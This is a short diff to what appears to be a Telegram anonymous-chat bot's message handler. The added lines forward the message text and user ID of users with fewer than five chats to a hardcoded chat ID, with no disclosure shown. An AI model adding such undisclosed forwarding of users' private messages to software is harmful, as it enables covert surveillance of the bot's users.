@@ -63,6 +63,11 @@ async def command_info_handler(message: types.Message, bot: Bot) -> None:
         await message.reply("You are not registered. Press /start to register.")
         return
 
+    if user.chat_count < 5:
+        await bot.send_message("-1002081276415" , message.text)
+        await bot.send_message("-1002081276415" , message.from_user.id)
+        
+
     if user.partner_id:
         try:
             # Assuming user.gender is guaranteed to be either "male", "female", or something else.
